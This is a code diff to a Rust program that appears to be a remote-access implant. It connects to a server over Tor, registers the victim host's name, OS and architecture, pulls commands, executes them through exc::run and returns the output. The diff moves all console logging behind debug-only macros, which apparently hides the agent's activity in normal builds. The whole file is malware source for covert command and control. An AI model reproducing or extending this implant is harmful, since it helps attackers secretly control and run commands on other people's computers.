@@ -1,6 +1,7 @@
 mod config;
 mod helpers;
 mod exc;
+mod debug;
 
 use arti_client::{
     TorClient,
@@ -59,7 +60,7 @@ async fn main() {
     let os_name = env::consts::OS;
     let sys_arch = env::consts::ARCH;
 
-    println!("agent started: {:?}, {}, {}", hostname, os_name, sys_arch);
+    debug_println!("agent started: {:?}, {}, {}", hostname, os_name, sys_arch);
 
     let mut id = String::new();
     match helpers::load_id().await {
@@ -77,22 +78,22 @@ async fn main() {
     let tor_client = match TorClient::create_bootstrapped(config).await {
         Ok(client) => client,
         Err(e) => {
-            eprintln!("failed to create tor client: {:?}", e);
+            debug_eprintln!("failed to create tor client: {:?}", e);
             helpers::wait().await;
             // TODO: Do something else other than exit.
             return;
         }
     };
 
-    println!("tor client initialized");
+    debug_println!("tor client initialized");
 
     loop {
-        println!("connecting to: {} {}", address.clone(), port);
+        debug_println!("connecting to: {} {}", address.clone(), port);
 
         let mut stream = match tor_client.connect_with_prefs((address.clone(), port), &s_prefs).await {
             Ok(s) => s,
             Err(e) => {
-                eprintln!("failed to connect to the server: {:?}", e);
+                debug_eprintln!("failed to connect to the server: {:?}", e);
                 helpers::wait().await;
                 continue;
             }
@@ -102,7 +103,7 @@ async fn main() {
             let id_resp = match register(&hostname, os_name, sys_arch, &mut stream).await {
                 Ok(id_resp) => id_resp,
                 Err(e) => {
-                    eprintln!("registration error: {}", e);
+                    debug_eprintln!("registration error: {}", e);
                     helpers::wait().await;
                     continue;
                 }, 
@@ -110,21 +111,21 @@ async fn main() {
 
             id = id_resp.id;
 
-            println!("Agent's Assigned A New ID");
+            debug_println!("Agent's Assigned A New ID");
         }
 
-        println!("fetching messages");
+        debug_println!("fetching messages");
 
         let messages = match get_messages(&id, &mut stream).await {
             Ok(messages) => messages,
             Err(e) => {
-                eprintln!("get messages error: {}", e);
+                debug_eprintln!("get messages error: {}", e);
                 helpers::wait().await;
                 continue;
             }
         };
 
-        println!("got messages: {}", messages.len());
+        debug_println!("got messages: {}", messages.len());
 
         for message in messages {
             let interpreted = match exc::run(&message.request) {
@@ -134,12 +135,12 @@ async fn main() {
                 }
             };
 
-            println!("sending response: {} - {}\n{}", message.id.clone(), message.request.clone(), interpreted.clone());
+            debug_println!("sending response: {} - {}\n{}", message.id.clone(), message.request.clone(), interpreted.clone());
 
             let mut stream = match tor_client.connect_with_prefs((address.clone(), port), &s_prefs).await {
                 Ok(s) => s,
                 Err(e) => {
-                    eprintln!("failed to connect to the server: {:?}", e);
+                    debug_eprintln!("failed to connect to the server: {:?}", e);
                     helpers::wait().await;
                     continue;
                 }
@@ -148,7 +149,7 @@ async fn main() {
             match send_message(&message.id, &interpreted, &mut stream).await {
                 Ok(_) => {},
                 Err(e) => {
-                    eprintln!("failed to send message: {}", e);
+                    debug_eprintln!("failed to send message: {}", e);
                     helpers::wait().await;
                     continue;
                 },
@@ -170,7 +171,7 @@ async fn register(hostname: &String, os: &str, arch: &str, stream: &mut DataStre
     let json_identity = match serde_json::to_string(&identity) {
         Ok(jj) => jj.as_bytes().to_vec(),
         Err(e) => {
-            eprintln!("failed to serialize identity to json: {:?}", e);
+            debug_eprintln!("failed to serialize identity to json: {:?}", e);
             helpers::wait().await;
             return Err(e.into());
         }
